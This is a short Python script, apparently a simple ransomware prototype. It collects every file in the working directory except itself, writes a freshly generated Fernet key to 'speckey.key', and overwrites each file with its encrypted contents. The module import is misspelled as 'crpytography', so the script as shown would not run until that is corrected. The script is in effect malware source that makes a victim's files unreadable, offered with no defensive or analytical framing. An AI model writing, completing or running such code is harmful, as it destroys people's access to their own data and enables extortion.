import os
from crpytography.fernet import Fernet
files_to = []

for file in os.listdir(): #do or lines for this file, key file and dec file
    if file == "yo.py":
        continue
    if os.path.isfile(file):
        files_to.append(file)

print(files_to)

key = Fernet.generate_key()

with open("speckey.key", "wb") as speckey:
    speckey.write(key)

for file in files_to:
    with open(file, "rb") as specfile:
        contents = specfile.read()
    contents_enc = Fernet(key).encrypt(contents)

    with open(file, "wb") as specfile:
        specfile.write(contents_enc)